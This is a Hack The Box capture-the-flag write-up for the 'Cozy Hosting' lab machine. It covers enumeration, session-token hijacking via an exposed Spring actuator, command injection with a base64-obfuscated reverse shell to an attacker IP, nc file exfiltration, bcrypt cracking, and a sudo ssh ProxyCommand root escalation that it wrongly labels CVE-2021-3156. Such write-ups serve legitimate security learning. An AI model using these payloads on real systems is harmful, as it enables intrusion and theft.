# Hack The Box Write Up: Cozy Hosting

## Intro

Hey fellow hacker! Your'e gonna read my first Hack The Box (HTB) Write Up. Please share your feedback with me! Have fun!

## Preparation
### Make Sure your DNS Resolution works properly

E.g. analog to this:
``` 

Add IP to the /etc/hosts and it should resolve the issue.

┌──(kali㉿kali)-[~/Downloads]

└─$ cat /etc/hosts  
127.0.0.1 localhost

127.0.1.1 kali

10.10.11.189 precious.htb
```

## Hacking / Pentesting

### Service Discovery / Enumeration

We start classically using nmap for service discovery. As our target consists of only one host.
#### Port Scanning
Since this was my first Box ever, I tried several (more sophisticated) nmap scans. Finally, I did only require the results of the very first and simple scan listed below. 

Let's see: 
* ssh
* http
* us-srv
##### Quick [[Network Mapper (Nmap)]] Scan
``` shell
└──╼ $sudo nmap $IP 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-20 05:19 CEST
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 14.20% done; ETC: 05:20 (0:00:06 remaining)
Nmap scan report for 10.10.11.230
Host is up (0.067s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8083/tcp open  us-srv
```

#### Banner Grabbing / Service Enumeration
Let's grab the relevant service versions.
##### ssh
``` shell
└──╼ $nc -nv 10.10.11.230 22
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.11.230:22.
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3
```

#### Port 80 nginx/1.18.0 (Ubuntu)

Basic TCP Banner-Grap attempt using nc.

``` shell
└──╼ $nc -nv 10.10.11.230 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.11.230:80.
```

The Chatty Webserver tells us the target is running` nginx/1.18.0 (Ubuntu)` with a Bootstrap like Web Application

``` shell
└──╼ $curl http://$IP:80
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

``` shell
└──╼ $whatweb http://cozyhosting.htb:80
http://cozyhosting.htb:80 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Email[info@cozyhosting.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.230], Lightbox, Script, Title[Cozy Hosting - Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
```

#### Port 8083 us-srv?

I wonder what `Port 8083` is exposing... It reminds me of some kind of a web application dev port.

After some research, I concluded the Service running on port `8083/tcp open  us-srv` is possibly meant for virtualization purposes.

``` shell
nmap $IP -p 8083 -sV --version-intensity 9

PORT     STATE SERVICE VERSION
8083/tcp open  us-srv?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 272.00 second
```

### Web-App Enumeration

![[Pasted image 20230921152620.png]]
#### Directory Enumeration using `gobuster`

`Gobuster` found promising endpoints, such as
* /admin
* /login

We can assume `/admin` requires an admin permission login (401)

``` shell
└──╼ $gobuster dir -u http://cozyhosting.htb --wordlist /usr/share/dirb/wordlists/big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/09/20 06:52:28 Starting gobuster in directory enumeration mode
===============================================================
/[                    (Status: 400) [Size: 435]
/]                    (Status: 400) [Size: 435]
/admin                (Status: 401) [Size: 97] 
/asdfjkl;             (Status: 200) [Size: 0]  
/error                (Status: 500) [Size: 73] 
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431] 
/logout               (Status: 204) [Size: 0]    
/plain]               (Status: 400) [Size: 435]  
/quote]               (Status: 400) [Size: 435]  
/secci�               (Status: 400) [Size: 435]  
                                                 
===============================================================
2023/09/20 06:54:28 Finished
===============================================================
```

#### Source code check
Not that interesting, but a quick look at the source code reveals that the web app is hosting Bootstrap 5.2.3 template frontend. 

#### Login

Now lets progress to the more interesting parts.
Let's open BurpSuite and smash some random creds into the input form.

``` HTTP
POST /login HTTP/1.1
Host: cozyhosting.htb
Content-Length: 21
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=admin&password=§password§
```

I tried a dictionary attack with some basic (idiot) passwords but non of them worked. Maybe the user name `admin` is not existing or they really applied a conform password?

Let's go back to further directory enumeration...
#### Directory Enumeration Pt.2 Dirbuster
``` 
--------------------------------
Files found during testing:

Files found with a 200 responce:

/login
/assets/vendor/aos/aos.js
/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
/assets/vendor/glightbox/js/glightbox.min.js
/assets/vendor/swiper/swiper-bundle.min.js
/assets/js/main.js
...
/actuator/health/
```

`/actuator/health` looks suspicious to me, some kind of Spring Service Status Endpoint. 

After further examination we can find some kind of API JSON doc under `/actuator`:
``` JSON
{"_links":{"self":{"href":"http://localhost:8080/actuator","templated":false},"sessions":{"href":"http://localhost:8080/actuator/sessions","templated":false},"beans":{"href":"http://localhost:8080/actuator/beans","templated":false},"health":{"href":"http://localhost:8080/actuator/health","templated":false},"health-path":{"href":"http://localhost:8080/actuator/health/{*path}","templated":true},"env":{"href":"http://localhost:8080/actuator/env","templated":false},"env-toMatch":{"href":"http://localhost:8080/actuator/env/{toMatch}","templated":true},"mappings":{"href":"http://localhost:8080/actuator/mappings","templated":false}}}
```

`/actuator/sessions` reveales leaked Session Tokens

``` JSON
{"3D68EA88F6D7EA3C5D8EB69EF3FA2801":"kanderson","7D5001CCA65267631BCED0171AE52B36":"kanderson","9714563D7FD768B5CD6D489C1FCC3000":"kanderson"}
```

### Exploit Login via Burp Suite

After Intercepting the 3 Login Requests where the Cookie
```
Cookie JSESSIONID=xx
```
should be replaced by kanderson's valid Session Token we're redirected into an admin panel.

![[Pasted image 20230921145119.png]]


### Exploit Server via Connection-Settings Form

#### Getting Started
A quick analysis shows that one interesting endpoint is accessible via the Connection Settings form:
`POST /executessh`
Surely, this endpoint screams for exploitation. So i fiddled around with it using Burp.

``` HTTP
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Length: 21
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=E5AD66E7605EB2B67533DF889A1EC5AB
Connection: close

host=abc&username=vcb
```

#### Security Mechanisms
The Input is parsed by the app's backend allowing 
* only valid Host names (IP-Pattern, single word, no spaces, etc.)
* usernames without spaces

But basically it is possible to interrupt the internal 
`ssh username@host` implementation... e.g. using `;` symbol

#### Prepare Exploit
For me as a beginner it was quite challenging to create a payload without spaces. 
Finally, I found a solution from [hacktricks](https://hacktricks.boitatech.com.br/linux-unix/useful-linux-commands/bypass-bash-restrictions#bypass-forbidden-spaces). Thanks mate!
``` shell

# first craft the payload
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.16.23/1234 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'

# payload ready for exploitation
echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4Tmk0eU15OHhNak0wSURBK0pqRUsK|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

#### Exploit reverse shell

Prepare `nc` listener
``` shell
nc -lvnp 1234
```

Exploit
``` HTTP

POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Length: 172
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin?error=Host%20key%20verification%20failed.
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=F4047C18D5306FC458AEDD5A36821ACB
Connection: close

host=10.10.11.230&username=;echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4Tmk0eE1DOHhNak0wSURBK0pqRUsK|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h;
```

### Inside as user `app` 

After successful exploitation, we're logged in as user `app`. No flag for now... let's see...

The only non-root user is named `josh`, I bet he keeps our first flag.

Within our home directory we find a .jar file looking like containing the webapp we just exploited.
#### download cloudhosting-0.0.1.jar

Let's download the file for further investigation
``` shell
# prepare download receiver
┌─[pk2codes@parrot]─[~/htb/boxes/CozyHosting]
└──╼ $nc -l -p 9999 > app.jar

# prepare download sender
app@cozyhosting:/app$ nc -w 3 10.10.16.23 9999 < cloudhosting-0.0.1.jar
```

#### Quick Analysis
* Spring Boot Application
* Server is running on postgresql

application.properties
``` properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Interesting! We just found the database creds. 
#### Postqres Port Closed
In order to circumvent the annoying nc download, I checked the postgres port via nmap but it's closed.

``` shell
└──╼ $nmap 10.10.11.230 -p 5432
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-21 08:26 CEST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.039s latency).

PORT     STATE  SERVICE
5432/tcp closed postgresql

```
#### Export db via reverse shell
Ok, so we just download it using netcat... first we export the data base using `pg_dump`:
``` shell
 pg_dump -p 5432 -d cozyhosting -h 127.0.0.1 -U postgres -W > /tmp/psqlexp.pgsql
 # pwVg&nvzAQ7XxR
```

#### download export
``` shell
┌─[✗]─[pk2codes@parrot]─[~/htb/boxes/CozyHosting]
└──╼ $nc -l -p 9999 > pqsqlexport.pgsql
```

#### Found Password for new User admin

After checking the very small db export, we found a hashed admin password
``` postresql
--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.users (name, password, role) FROM stdin;
kanderson	$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim	User
admin	$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm	Admin
\.
```

#### [Hash Analysis](https://www.tunnelsup.com/hash-analyzer/)
Analysis shows bcrypt Blowfish... a decent encryption algorithm. 
```
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm - Possible algorithms: bcrypt $2*$, Blowfish (Unix)

[SEARCH AGAIN](https://hashes.com/en/tools/hash_identifier)
```

I racked my brain about whether to attempt cracking it.
#### Crack using hashcat

And of course I tried.
``` shell
➜  htbhashcrack hashcat -m 3200 -a 0 -o cracked.txt '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' ~/Downloads/1000000-password-seclists.txt

➜  htbhashcrack cat cracked.txt 
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

Yey! My first cracked (idiot) password ever. Feels great!

#### Try Login
Now let's try login as josh using the cracked pw.
``` shell
ssh josh@10.10.11.230
```

Viola! It worked! First flag secured!
#### 1x1 of privilege escalation

``` shell
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

This first check looks pretty obvious exploitable. Nevertheless I did an enumeration using [LinEnum.sh](https://github.com/rebootuser/LinEnum). But It looked pretty solid (at least for a noob like me).

#### Exploit "CVE-2021-3156" aka "Baron Samedit"

##### Search

I tried one or two hours to find some way to exploit the ssh access. My best bet was to access root's private ssh key like so:

``` shell
sudo /usr/bin/ssh -i /root/.ssh/id_rsa root@localhost
```

But unfortunately there was no private key available to steal.

Luckily there are very smart people sharing clever ideas via the internet. So i found this exploit using [gtfobins](https://gtfobins.github.io/).
``` shell
sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```


##### Explanation 

ProxyCommand allows execution of a command in order to enable a proxy connection.
```shell
Host myserver HostName remote.example.com ProxyCommand ssh user@proxy.example.com -W %h:%p
```

a shell is opened and kept alive in combination with:
``` shell
;sh 0<&2 1>&2
```

standard in and output are redirected. 
Through the previous Sudo command, this shell is started with root rights and it remains open through the redirection.



## Lessons learned

* There is never enough web enumeration
* sudo -l is mostly an easy win
